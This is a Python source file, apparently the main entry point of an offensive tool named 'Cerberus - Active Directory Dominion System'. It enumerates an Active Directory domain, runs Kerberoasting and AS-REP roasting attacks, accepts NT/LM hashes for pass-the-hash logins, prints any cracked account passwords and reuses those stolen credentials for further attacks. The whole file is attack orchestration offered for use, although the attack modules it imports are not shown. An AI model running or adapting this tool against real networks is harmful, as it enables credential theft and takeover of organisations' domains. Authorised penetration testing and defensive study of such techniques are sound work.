#!/usr/bin/env python3
"""
Cerberus - Active Directory Dominion System
Main entry point
"""

import argparse
import sys
from config import DEFAULT_DOMAIN, DEFAULT_DC_IP, DEFAULT_USER, DEFAULT_PASSWORD
from core.authenticator import Authenticator
from core.enumerator import ADEnumerator
from core.kerberoaster import Kerberoaster
from core.asreproaster import ASREPRoaster
from core.utils import print_status, print_success, print_error, print_critical

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Cerberus - Active Directory Dominion System")
    parser.add_argument("-d", "--domain", default=DEFAULT_DOMAIN, help="Target domain")
    parser.add_argument("-u", "--username", default=DEFAULT_USER, help="Username")
    parser.add_argument("-p", "--password", default=DEFAULT_PASSWORD, help="Password")
    parser.add_argument("-dc", "--domain-controller", default=DEFAULT_DC_IP, help="Domain controller IP")
    parser.add_argument("--lmhash", help="LM hash for authentication")
    parser.add_argument("--nthash", help="NT hash for authentication")
    parser.add_argument("--kerberoast", action="store_true", help="Perform Kerberoasting attack")
    parser.add_argument("--asreproast", action="store_true", help="Perform AS-REP roasting attack")
    parser.add_argument("--enumerate", action="store_true", help="Perform AD enumeration")
    parser.add_argument("--all", action="store_true", help="Perform all attacks")
    
    args = parser.parse_args()
    
    # Validate arguments
    if not any([args.kerberoast, args.asreproast, args.enumerate, args.all]):
        parser.print_help()
        sys.exit(1)
    
    # Authenticate
    auth = Authenticator(
        args.domain, 
        args.username, 
        args.password, 
        args.lmhash, 
        args.nthash, 
        args.domain_controller
    )
    
    if not auth.ldap_authenticate():
        print_critical("Authentication failed. Exiting.")
    
    # Perform requested actions
    if args.enumerate or args.all:
        enumerator = ADEnumerator(auth.get_ldap_connection(), args.domain)
        vulnerabilities = enumerator.enumerate_domain()
        enumerator.export_findings()
    
    if args.kerberoast or args.all:
        # Find Kerberoastable users and attack them
        if 'vulnerabilities' not in locals():
            enumerator = ADEnumerator(auth.get_ldap_connection(), args.domain)
            vulnerabilities = enumerator.enumerate_domain()
        
        kerberoastable = [v for v in vulnerabilities if v['type'] == 'KERBEROASTING']
        
        if kerberoastable:
            kerberoaster = Kerberoaster(
                args.domain, 
                args.username, 
                args.password, 
                args.domain_controller,
                args.lmhash,
                args.nthash
            )
            
            for vuln in kerberoastable:
                cracked = kerberoaster.attack(vuln['target'])
                if cracked:
                    print_success(f"Successfully compromised {vuln['target']} with password: {cracked}")
                    # Update credentials for further attacks
                    args.username = vuln['target']
                    args.password = cracked
                    args.lmhash = ""
                    args.nthash = ""
        else:
            print_error("No Kerberoastable users found")
    
    if args.asreproast or args.all:
        # Find AS-REP roastable users and attack them
        if 'vulnerabilities' not in locals():
            enumerator = ADEnumerator(auth.get_ldap_connection(), args.domain)
            vulnerabilities = enumerator.enumerate_domain()
        
        asreproastable = [v for v in vulnerabilities if v['type'] == 'ASREP']
        
        if asreproastable:
            asreproaster = ASREPRoaster(args.domain, args.domain_controller)
            
            for vuln in asreproastable:
                cracked = asreproaster.attack(vuln['target'])
                if cracked:
                    print_success(f"Successfully compromised {vuln['target']} with password: {cracked}")
                    # Update credentials for further attacks
                    args.username = vuln['target']
                    args.password = cracked
                    args.lmhash = ""
                    args.nthash = ""
        else:
            print_error("No AS-REP roastable users found")
    
    print_success("Cerberus execution completed")

if __name__ == "__main__":
    main()